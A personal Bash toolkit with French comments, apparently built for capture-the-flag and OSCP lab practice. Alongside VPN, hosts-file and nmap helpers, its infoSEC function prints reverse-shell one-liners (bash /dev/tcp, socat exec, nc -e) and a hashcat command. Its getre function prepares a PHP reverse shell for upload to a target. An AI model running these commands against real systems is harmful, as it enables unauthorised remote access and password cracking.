#!/usr/bin/bash

#alias vpn="sudo openvpn"
# le ~ n'est pas interprété dans les script !!! du coup eval
#basedir=$(eval echo "~$USER/Documents")
basedir="$HOME/Documents"
ctf_basedir="${basedir}/ctf"
ctf_dir=""
ctf="FALSE"
ctf_working_tree={nmap,www,exploit,data}
vpndir="$basedir/vpn"
vpnFileTHMvip1="$vpndir/tryhackme_vip1.ovpn"
vpnFileTHMvip2="$vpndir/tryhackme_vip2.ovpn"
vpnFileTHM="$vpndir/tryhackme.ovpn"
vpnFileHTB="$vpndir/htb_eu_srv1.ovpn"
vpnFileOSCP="$vpndir/oscp.ovpn"
target_file="/home/topklean/Documents/ctf/target"

declare -A ctfProvider=( htb "htb" thm "thm" oscp "oscp" )

# Colors
initColors() { : # init colors

	# ANSI COLOR
	COLOR_CODE="\033["
	BLACK="${COLOR_CODE}0;30m"
	RED="${COLOR_CODE}1;31m"
	GREEN="${COLOR_CODE}1;32m"
	YELLOW="${COLOR_CODE}1;33m"
	BLUE="${COLOR_CODE}1;34m"
	PURPLE="${COLOR_CODE}1;35m"
	CYAN="${COLOR_CODE}1;36m"
	GRAY="${COLOR_CODE}0;37m"
	COLOR_RESET="${COLOR_CODE}0m"
	
	# MY COLORS
	OK="$CYAN"
	KO="$RED"
	INFO="$GRAY"

}

# Helpers
ctfInitHTB () { : # init Hack The Box ctf
	ctfInit htb "$@";
}
ctfInitTHM () { : # init Try Hack Me  ctf
	ctfInit thm "$@";
}
ctfInitOSCP () { : # init OSCP
	ctfInit oscp "$@";
}

# vpn
vpnTHMvip1 ()  { : # start vpn Try Hack Me vip 1
	ctfInitVpn t1; }
vpnTHMvip2 ()  { : # start vpn Try Hack Me vip 2
	ctfInitVpn t2; }
vpnTHM ()  { : # start vpn Try Hack Me free
	ctfInitVpn t; }
vpnHTB ()  { : # start vpn Hack The Box
	ctfInitVpn h; }
vpnOSCP () { : # start vpn OSCP
	ctfInitVpn o; }

# nmap categories description (from nmap web site) - all in bash hash table with category name as key 
declare -A nmap_categories_desc
nmap_categories_desc["auth"]="authentication credentials (or bypassing them)"
nmap_categories_desc["broadcast"]="discovery of hosts not listed on the command line by broadcasting on the local network"
nmap_categories_desc["brute"]="brute force attacks to guess authentication credentials of a remote server"
nmap_categories_desc["default"]="run when using the -sC or -A or --script=default"
nmap_categories_desc["discovery"]="try to actively discover more about the network by querying public registries, SNMP-enabled devices, directory services, and the like"
nmap_categories_desc["dos"]="may cause a denial of service"
nmap_categories_desc["exploit"]="actively exploit some vulnerability"
nmap_categories_desc["external"]="may send data to a third-party database or other network resource"
nmap_categories_desc["fuzzer"]="send server software unexpected or randomized fields in each packet"
nmap_categories_desc["intrusive"]="risks are too high that they will crash the target system"
nmap_categories_desc["malware"]="test whether the target platform is infected by malware or backdoors"
nmap_categories_desc["safe"]="Scripts which weren't designed to crash service"
nmap_categories_desc["version"]="extension to the version detection feature. Run only if version detection -sV was requested"
nmap_categories_desc["vuln"]="check for specific known vulnerabilities. Generally only report results if they are found."

ctfInitVpn () { : # Init VPN - <t1|t2|t|h|o>
	
	case ${1,,} in
		t1|thm1)
			echo "connexion à $1 ... 🤬"
			sudo openvpn "$vpnFileTHMvip1"
			return $?;;
		t2|thm2)
			echo "connexion à $1 ... 🤬"
			sudo openvpn "$vpnFileTHMvip2"
			return $?;;
		t|thm)
			echo "connexion à $1 ... 🤬"
			sudo openvpn "$vpnFileTHM"
			return $?;;
		h|htb)
			echo "connexion à $1 ... 🤬"
			sudo openvpn "$vpnFileHTB"
			return $?;;
		o|oscp)
			echo "connexion à $1 ... 🤬"
			sudo openvpn "$vpnFileOSCP"
			return $?;;
		*) echo "VPN $1 inconu... 🤬"; return 128;;
	esac
}

ctfSetIpTarget () { : # Set IP of target CTF
	echo -en "${1:- ::: No target ::: }" > "$target_file"
	export victime="$1" 
}

ctfGetIpTarget () { : # Get IP of target CTF
	export victime=$(< "$target_file")
	echo -en "$victime" | xclip
	echo "$victime => in clipboard (mouse paste...)" >&2
}

ctfInit () { : # core ctf Init function
	# usage
	[[ $# -eq 0 ]] && {
			echo
			echo "ctfInit <provider> <room> <victime>"
			echo
			echo "        provider : [ ${!ctfProvider[*]} ]"
			echo "        room     : the name of the room"
			echo "        victime  : the IP of the victime"
			return 128
	}

	# site ctf
	[[ "${1,,}" =~ ^(thm|htb|oscp)$ ]] || {
		echo "hummm... encore un problème de clavier 🤬 (${!ctfProvider[*]})";
		return 128
	}
	# Nom de la room
	[[ -z $2 ]] && { echo "humm, c'est quoi la room ? 🥱 "; return 128 ; }
	# IP
	[[ -z $3 ]] && { echo "humm, pas de victime 🥱 ( aaa.bbb.ccc.ddd )"; return 128 ; }
	[[ $3 =~ [0-9]{1,3}(\.[0-9]{1,3}){3} ]] || {
		echo "doigts crochus 🤦 ( aaa.bbb.ccc.ddd )"
		return 128
	}

	export room="$2"
	export ctf_dir="${ctf_basedir}/${ctfProvider[${1,,}]}/$room"
	ctfSetIpTarget "$3"
	ctf="TRUE"

	echo "$room | 💀 $(monip v) | 🥶 $IP "
	# cd "$ctf_dir" 2>/dev/null || echo "$ctf_dir absent 🤬 fait un effort 🙏"
	# cd "$ctf_dir" || echo "$ctf_dir absent 🤬 fait un effort 🙏"

	ctfMkdir

}

ctfMkdir () { : # creating directories
	[[ $ctf = "TRUE" ]] && {
		echo "un peu d'action 😏";
		eval mkdir -p "$ctf_dir/$ctf_working_tree"
		cd "$ctf_dir"	
		tree --noreport "$ctf_dir" 
	} || {
		return 128;
	} 	
}

monip () { : # get all IPs of the machine v=vpn p=private
	while read inter
	do
		[[ $1 = "v" && $inter =~ tun ]] && { ip -o a s $inter|grep -Poi '(\d+\.)+\d+(?=/\d+)'; continue; }
		[[ $1 = "p" && $inter =~ eth ]] && { ip -o a s $inter|grep -Poi '(\d+\.)+\d+(?=/\d+)'; continue; }
		[[ -z $1 && $inter != lo ]]     && { ip -o a s $inter|grep -Poi '(\d+\.)+\d+(?=/\d+)'; continue; }
	done < <(ip -br link | grep -Poi '^[^\s]+')
}

monippublic () { : # get public IP (internt facing IP)
	curl -s -A 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0' http://www.mon-ip.com/|grep -Pi "(?=.*Adresse IP est :)"|grep -Poi '(\d{1,3}\.){3}\d{1,3}'
}

hostadd () { : # add IP FQDN to /etc/hosts
#	set -x
	print_host="FALSE"
	mark="XXX"
	sudo_cmd=/usr/bin/sudo

	hosts_file=/etc/hosts
	
	[[ $# -eq 0 ]] && {
		{
			echo "hostadd [-p] <IP> <hostname>"
			echo
			echo "		[-p] display /etc/hosts after modification"
			echo
			echo "# ========= /etc/host ============="
			echo "#"
			cat $hosts_file
		} |	batcat -l sh --file-name hosts
		return 128
	}
	
	[[ $1 = "-p" ]] && { shift; print_host="TRUE"; }
	[[ -z $* ]] && { batcat $hosts_file; return 0; }

	[[ $1 =~ ([0-9]{1,3}\.){3}[0-9]{1,3} ]] || { echo "BAD IP: $1"; return -128; }
	[[ -n "$2"  ]] || { echo "GIVE A HOSTNAME !!!"; return -128; }

	$sudo_cmd cp "$hosts_file"{,_$(date "+%Y%m%d_%H%M%S_%s")} || { echo "not able to backup $hosts_file"; return -128; }
	
	echo -en "# ==== topklean $(date '+%H:%M:%S %d/%m/%Y') ($mark) ====\n" | $sudo_cmd tee -a "$hosts_file" >/dev/null
	echo -en "$1\t" | $sudo_cmd tee -a "$hosts_file" >/dev/null
	shift
	echo -en "$*\t" | $sudo_cmd tee -a "$hosts_file" >/dev/null
	echo -en "$mark\n" | $sudo_cmd tee -a "$hosts_file" >/dev/null
	
	[[ $print_host == "TRUE" ]] && cat $hosts_file
}

hostclean () { : # clean /etc/hosts
#	set -x
	mark="XXX"
	sudo_cmd=/usr/bin/sudo

	hosts_file=/etc/hosts

	$sudo_cmd sed -re "/$mark/d" $hosts_file -i"_$(date '+%Y%m%d_%H%M%S_%s')"
	
	[[ $1 = -p ]] && cat $hosts_file
}

whichSystem () { : # get system type from ping ttl ping

	initColors

	unset ttl

	declare -A oss_ttl
	oss_ttl=( \
				["1 64"]="linux"		\
				["65 128"]="windows"	\
				["XXX"]="${RED}inconu"	\
	)
	
	dsp() {
		printf "\t[-] ($ip) ${GREEN}${1:-XXX}${COLOR_RESET} => ${CYAN}${2:-${RED}inconu !!!}${COLOR_RESET}\n";
	}

	ip="${1:-XXX}"

	[[ -n "$1" ]] || { dsp "IP ?"; return 1; }

	pg=$(ping -n -w1 -W1 -c1 "$ip" 2>/dev/null)
	p='ttl=[^ ]+'
	[[ $pg =~ $p ]] &&  ttl=${BASH_REMATCH##*=}

	: ${ttl:="XXX"}

	for k in "${!oss_ttl[@]}"; do
		low=${k%% *}; high=${k##* };
		(( ttl >= low && ttl <= high )) && { dsp "$ttl" "${oss_ttl[$k]}"; return 0; }
	done
    dsp >&2 ; return 1;

}

whichSystems () { : # try in parallel for many system (have to test)
	declare -xf initColors whichSystem
	[[ $1 == -[qQ] ]] && { shift; filter='|& grep -iv xxx'; }  || { unset filter; }

	parallel -j100 whichSystem {} $filter ::: "$@"
} 

ctfList () { : # list of done CTFs or in progress

	case "${1,,}" in
		t|thm)  
			tree -i --noreport -C -L 1 -d $ctf_basedir/thm/ | \
			sed -re '/Document/! s/^/[*] /'      | \
			batcat --file-name "Try Hack Me [ total $(ls -A -1 $ctf_basedir/thm/|wc -l)  ]"
			;;
			# ls -1 -A -d "$ctf_basedir/thm/"*; return 0;;
		o|oscp)
			tree -i --noreport -C -L 1 -d $ctf_basedir/oscp/ | \
			sed -re '/Document/! s/^/[*] /'      | \
			batcat --file-name "OSCP [ total $(ls -A -1 $ctf_basedir/oscp/|wc -l) ]"
			;;
			# ls -1 -A -d "$ctf_basedir/oscp/"*; return 0;;
		h|htb)
			tree -i --noreport -C -L 1 -d $ctf_basedir/htb/ | \
			sed -re '/Document/! s/^/[*] /'      | \
			batcat --file-name "Hack the box [ total $(ls -A -1 $ctf_basedir/htb/|wc -l) ]"
			;;
			# ls -1 -A -d "$ctf_basedir/htb/"* ; return 0;;
		*)
			tree -i --noreport -C -L 1 -d $ctf_basedir/*  | \
			sed -re '/Document/! s/^/[*] /' -e '/error/d' | \
			batcat --file-name "Hack the box [ total $(ls -A -1 $ctf_basedir/* |wc -l) ]"
			;;

	      	# ls -1 -d "$ctf_basedir/"*; return 0;
	esac
}

ctfGo () { : # cd to ctf dir => THM HTM OSCP 
	case "${1,,}" in
		t|thm)  cd $ctf_basedir/thm  ;;
		o|oscp) cd $ctf_basedir/oscp ;;
		h|htb)  cd $ctf_basedir/htb  ;;
		*)      cd $ctf_basedir;;
	esac
	ls -1 -A
}

extractPorts () { : # extract ports from nmap grepagle file
	[ -f "${1}" ] || { echo "\"$1\" c'est quoi ca ?"; return 128; }


	target_ports=$(grep -Poi '\d+(?=/open)' "$1" | xargs | tr ' ' ',')
#	target_ports="${target_ports::-1}"	
	export PORTS=${target_ports}
	target_ip=$(grep -Poi '(\d{1,3}\.){3}\d{1,3}$' "$1")
	echo -n "${target_ports}" | xclip -sel clip
	result="
[+] Extraction des informations de la victime...

  [>]         IP = $target_ip
  [>] open PORTS = $target_ports

   -- \$PORTS exportés --
   -- liste des ports copiée dans le presse papier (SHIFT+INSERT) --
"	
	# echo "$result" | batcat --theme Nord --style plain,snip,grid,numbers -l java
	clear && echo "$result" | batcat --theme "ansi" --style grid,numbers -l lua 
}

#### Nmap ####
nmap_scripts_dir='/usr/share/nmap/scripts'
nmap_scripts_db_name='script.db'
nmap_scripts_db="$nmap_scripts_dir/$nmap_scripts_db_name"

grepNmapScript () { : # get list of nmap script
	# ANSI COLOR
	COLOR_CODE="\033["
	BLACK="${COLOR_CODE}0;30m"
	RED="${COLOR_CODE}1;31m"
	GREEN="${COLOR_CODE}1;32m"
	YELLOW="${COLOR_CODE}1;33m"
	BLUE="${COLOR_CODE}1;34m"
	PURPLE="${COLOR_CODE}1;35m"
	CYAN="${COLOR_CODE}1;36m"
	GRAY="${COLOR_CODE}0;37m"
	COLOR_RESET="${COLOR_CODE}0m"
	
	# MY COLORS
	OK="$CYAN"
	KO="$RED"
	INFO="$GRAY"
	
	# all categories
	nmap_categories="grep -Poi '(?<= \")[^\"]+' $nmap_scripts_db|grep -Piv '.*nse$'|sort -u|tr '\n' ' '"
	# all the categories separated by |
	nmap_categories_case=$(grep -Poi '(?<= \")[^\"]+' $nmap_scripts_db|grep -Piv '.*nse$'|sort -u|tr '\n' '|')
	# total by category (total categorie)
	nmap_categories_total_by="grep -Poi '(?<= \")[^\"]+' $nmap_scripts_db|grep -Piv '.*nse$'|sort| uniq -c"

	# display  help
	[[ ${1,,} =~ ^(-?h|--help)$ ]] && {
		echo "
grepNmapScript 

  grepNmapScript [-r] [cat [motif]] | motif | (d|-d|desc|-desc) <script.nse> | <script.nse>

  grepNmapScript              affiche le nombre de scripts par catégorie (défaut)


  grepNmapScript motif        recherche le motif dans le nom du script ou et dans sa catérogie
                              affiche la liste des scripts correspondant

  grepNmapScript cat [motif]  affiche la liste des scirpts par catégorie
                              (en cas d'erreur, affiche les catégories)
                              motif: recherche les scripts de la catégorie
                                     correspondants au motif (regex)

                 -r           désactive l'affiche de la descrition dans les mode motif et cat
                              aucun effet sur l'affache par défaut

  grepNmapScript [-]d|[-]desc script.nse 
                            affiche l'aide complète du scirpts
                            (nmap --script-help script.nse)

  grepNmapScript script.nse   affiche le source du script script.nse

"
		return 0;
	}
	
	[[ ${1,,} == '-r' ]] && { shift; no_resume="TRUE"; } || { no_resume="FALSE"; }

	# display a script
	[[ -f "$nmap_scripts_dir/${1,,}" ]] && { 
		batcat -l lua "$nmap_scripts_dir/${1,,}"
		return 0;
	}
	# diff two categories
	[[ "${1,,}" =~ ^(-dif?|-diff?)$ && ${2,,} =~ ^(${nmap_categories_case%|})$ && ${3,,} =~ ^(${nmap_categories_case%|})$ ]] && {
		cat1=$(mktemp -t || return 128)
		cat2=$(mktemp -t || return 128)
		
		grep -Poi "(?=.*${2,,})\".+\.nse" $nmap_scripts_db| tr -d '"'	>> "$cat1"
		grep -Poi "(?=.*${3,,})\".+\.nse" $nmap_scripts_db| tr -d '"'	>> "$cat2"

		diff -B -w -y --suppress-common-lines "$cat1" "$cat2"

		rm -rf $cat1 $cat2 
		return 0
	}

	# display list of scripts by categorie or categorie and sub categorie
	[[ ${1,,} =~ ^(${nmap_categories_case%|})$ ]] && {
		[[ $no_resume == "TRUE" ]] && {
			batcat --paging never --file-name "script in category ${1} ${2}" < <(grep -Poi "(?=.*${1})\".+\.nse" $nmap_scripts_db| tr -d '"' | grep -Pi "${2}")
			return 0
		} || {
			while read file_name; do
				echo -en "$CYAN$file_name : \n\t\t$GRAY"
				grep -m1 -Pi -h -A1 "^ ?description(\s+)?=(\s+)?[\"\[]\[" < <(sed "/^$/d" $nmap_scripts_dir/$file_name)|tail -1
			done < <(grep -Poi "(?=.*${1})\".+\.nse" $nmap_scripts_db| tr -d '"' | grep -Pi "${2}") | \
			batcat --paging never --file-name "script in category ${1} ${2}"
			echo -en "$COLOR_RESET"
		}
		return 0;
	}
	# display a full script description
	[[ "${1,,}" =~ d|-d|-desc && -f "$nmap_scripts_dir/${2,,}" ]] && { 
		res=$(nmap --script-help ${2,,} | grep -v '^Starting Nmap'; echo;echo; )
		batcat --file-name "${2,,}"< <(echo "$res")
		return 0;
	}
	# search script name by motif (in $1)
	[[ -z ${1} ]] || {
		[[ $no_resume == "TRUE" ]] && {
			grep -Poi "(?=.*(?:${1}))\".+\.nse" $nmap_scripts_db| tr -d '"' | batcat --paging never --file-name "script corresponding to "${1}
			return 0
		} || {
			while read file_name; do
				echo -en "$CYAN$file_name : \n\t\t$GRAY"
				grep -m1 -Pi -h -A1 "^ ?description(\s+)?=(\s+)?[\"\[]\[" < <(sed "/^$/d" $nmap_scripts_dir/$file_name)|tail -1
			done < <(grep -Poi "(?=.*(?:${1}))\".+\.nse" $nmap_scripts_db| tr -d '"') | \
			batcat --paging never --file-name "script corresponding to "${1}
			echo -en "$COLOR_RESET"
			return 0;
		}
	}
    declare -a fme
	# defaut: display number scripts by category and categorie description
	while read total cat; do 
		fme[${#fme[@]}]=$(echo "$cat:($total):${nmap_categories_desc[$cat]}")
	done < <(eval $nmap_categories_total_by)
	
		fme[${#fme[@]}]="::"
		fme[${#fme[@]}]="-sC::équivalent de --script=safe,intrusive"
		fme[${#fme[@]}]="-A::équivalent de -O détection d'OS et de -sV scan Version"
		fme[${#fme[@]}]="::"

 	printf '%s\n' "${fme[@]}" | column -s":" -t | batcat --file-name "number of scripts by category.lua"

#\n\n-sC: équivalent de --script=safe,intrusive\n-A : équivalent de -O détection OS et -sV scan Version\n\n" | \
#	batcat --file-name "number of scripts by category.lua"
	# batcat --file-name "number of scripts by category.lua" < <(eval $nmap_categories_total_by)
	return 0;
}

#### Robots.txt security.txt sitemaps.xml ###
files=( robots.txt security.txt sitemap.xml humans.txt '.well-known' )
wwwGetRobots () { : # get robots.txt, security.txt & sitemap.xml
	curl_cmd='/usr/bin/curl'
	curl_options='-s -f -w'
	curl_options_writeout="%{http_code} %{exitcode}"
	curl_ua="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
	for f in ${files[@]}; do
		res=$($curl_cmd $curl_options "$curl_options_writeout" -A "$curl_ua" "$1/$f")
		[[ $res =~ 404 ]] && { echo "$f => absent "; continue; }
		[[ $res =~ 200 ]] && { 
			echo "$f :"
			echo "$res" | head -n -1
			echo
		}
		res=""
	done | batcat -l html --file-name "$1/{robots.txt,security.txt,sitemaps.xml}"
}

### get all comments in html source

wwwGetComment () { : # get html comment from a web page

	lynx -force-html -source "${1}" |grep -Poi '(?<=<!--)[^>]+' | sort -u
	# ^(?!<!--\s+-->)<!--.+-->
}

docFind () { : # ping & nmap & find doc
	cat <<-EOF
  
	  ping -c1 <target> # on packet sent

	    ttl => linux = 64 | windows = 128

	  ping -R -c1 <target> # display route



	  nmap -sV -sT -n <target>
	  find / -l -4000
EOF
}

infoSEC () { : # some security docs (reverse, hash, etc..)

[[ $1 == t ]] && {
echo "
	
	### bash ###
	bash -i >& /dev/tcp/10.7.77.105/17071 0>&1  # propre, shell direct
	/bin/bash -l > /dev/tcp/10.7.77.105/17071 0<&1 2>&1
	0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

	socat file:`tty`,raw,echo=0 TCP-L:4242
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.7.77.105:17071
	

	nc -lnvp 17771
	nc MONIP MONPORT -e /usr/sh
	

	python -c 'import pty; pty.spawn("/bin/bash")'

	listen : socat file:`tty`,raw,echo=0 tcp-listen:4444
	attack : socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444


	### terminal propre ###
	CTRL+Z
	echo '$TERM' => $TERM
	stty -a
	stty raw -echo
	fg
	reset
	export SHELL=bash
	export TERM=xterm256-color
	stty rows 38 columns 116
 

" | batcat -l bash --file-name "shell propre"
}

[[ $1 == h ]] && {

echo "
	hashid -m 'hash' => identifie l'algo de hash
	hash-identifier ...
	
	hashcat --help | grep -Pi algo (ex. md5)
	hashcat --hook-threads=12 -O -m algo_hash 'HASH' /usr/share/wordlists/rockyou.txt
	


" | batcat -l bash --file-name "hash"

}

echo "
	
	infoSec <param>	
		
		t : affiche info pour reverse et terminal
		h : affiche info pour hash mots de passes
"
}


### reverse shell ###

getre () { : # get reverse source (php)

	web_shell_dir='/usr/share/webshells'

	case ${1,,} in
		l|list)
			case ${2,,} in
				php) tree "$web_shell_dir/php"; return 0 ;;
				perl) tree "$web_shell_dir/perl"; return 0 ;;
				jsp) tree "$web_shell_dir/jsp"; return 0 ;;
				cfm) tree "$web_shell_dir/cfm"; return 0 ;;
				aspx) tree "$web_shell_dir/aspx"; return 0 ;;
				asp) tree "$web_shell_dir/asp"; return 0 ;;
				*) tree -f -l --noreport "$web_shell_dir"; return 0 ;;
			esac ;;
		h|help)
				echo "

getre cmd option

	cmd & option:
		
	* l|list	affiche la liste des reverse shell disponilbes  
				php|perl|jsp|cfm|aspx|asp pour afficher ceux du langage donné
	* port		créé un reverse shell php avec l'ip vpn et le port spécifié
				fichier cible => re.php
	*  			sans option crée un reverse shell php avec l'adresse ip vpn et
				et le port 22222
				fichier cible => re.php
"
				return 0
			;;
		*)
			;;
	esac

	re_local_port=${1:-22222}
	re_dst='re.php'
	reverse='/usr/share/webshells/php/php-reverse-shell.php'
	[[ ! -a $re_dst ]] && { cp $reverse $re_dst; }
	sed -i -e "s/127.0.0.1/$(monip v)/" -e "s/1234/${re_local_port}/" $re_dst
	echo "nc -lvnp $re_local_port" | xclip -sel clip

	echo "
	$re_dst créé avec $(monip v):$re_local_port => A upload sur la victime.
	
	écoute locale  => nc -lvnp $re_local_port (dans le presse-papier, <SHIFT+INSERT>)
	" | batcat -l lua --file-name "reverse re.php"
}

cleanTTY () { : # full interractive tty
echo "SHELL=/bin/bash script -q /dev/null
script -I /dev/null 2>/dev/null /bin/bash -p

python -c 'import pty; pty.spawn(\"/bin/bash\")'

Ctrl-Z

stty raw -echo; fg; reset xterm

export SHELL=bash; export TERM=xterm
$(read r l< <(stty size); echo stty rows $r columns $l)"| batcat -l bash --paging=never --style grid

} 

grepport () { : # seach port or service definition
	[[ "$@" =~ ^[0-9]+$ ]] && re=",$@," || re="$@";
	grep -Pi "$re" /home/topklean/Documents/dev/bash/tools/ports/service-names-port-numbers.csv|sed -re 's/,,+//g'|column -s'\,' -t -l4 -N Service,PORT,PROTO,...|batcat --paging=never -f -l "perl" --style numbers,grid;
}

grepportflat () { : # seach port or service definition
	[[ "$@" =~ ^[0-9]+$ ]] && re=",$@," || re="$@";
	grep -Pi "$re" /home/topklean/Documents/dev/bash/tools/ports/service-names-port-numbers.csv|sed -re 's/,,+//g'|column -s'\,'|batcat --paging=never -f -l "perl" --style numbers,grid;
}

xip () { : # extract IPs from file or pipe
	re='(\d{1,3}\.){3}\d{1,3}'
	[[ -f "$1" ]] && {
		grep -Poi "$re" "$1" | sort -u
	} || {
		 [[ ! -t 0 ]] && {
			grep -Poi "$re" | sort -u
		}
	}
}

grepcontenttype () { : # grep contype in seclist
	file_content_type="/usr/share/seclists/Miscellaneous/web/content-type.txt"
	[[ -n $1 ]] && grep -Poi --color=never ".*$1.*" "$file_content_type" | sort || sort "$file_content_type" | batcat -l sql --style numbers,grid
}

clearCache() { : # clear system cache
	sudo bash -c 'sync; echo 3 > /proc/sys/vm/drop_caches'
}


# Have to clean that
export GREP_COLORS='ms=38;5;135:mc=01;31:sl=:cx=:fn=35:ln=32:bn=32:se=36'

# display all function
# echo "${BASH_SOURCE[*]}"
# /usr/bin/sort < <(/usr/bin/grep -Poi '^.+ \(\)(?=\s*\{)' ${BASH_SOURCE[0]})

tty_size=$(stty size)
#tty_cols=${tty_size##* } # tjs à 80 !!!
tty_cols=150
dspfunc () { /usr/bin/grep -Poi '^[^#]+ \(\) +{ : #.*' ${BASH_SOURCE[0]} |column -s ":" -t | batcat --paging=never --decorations always --color always --terminal-width=$tty_cols --paging=never --style grid,numbers -l bash| sed -e 's/[{}]//';}
# dspalias () { /usr/bin/grep -Poi '^alias.*$'  ${BASH_SOURCE[0]}| sed -Ee 's/"//g' -e "s/'//g" | column -s "=" -t |batcat --terminal-width=$tty_cols --paging=never -l bash --style grid,numbers; }
# export CDPATH=.:$(tree --noreport -dif -L 1 ~/{,Documents,Downloads,apps,Music,Pictures,projects,snap,Videos,Templates}|tr '\n' ':' | xargs)

#reverse
dec2ascii() { : # print ascii from decimal value
	printf "\x$(printf "%x" $1)"
}

# définitions cybersec / recherche dans fichier
def(){ grep --color=always -Pi "$1" $HOME/Documents/docs/sec/definitions.md|grep -Ei '^\w+\b'; }
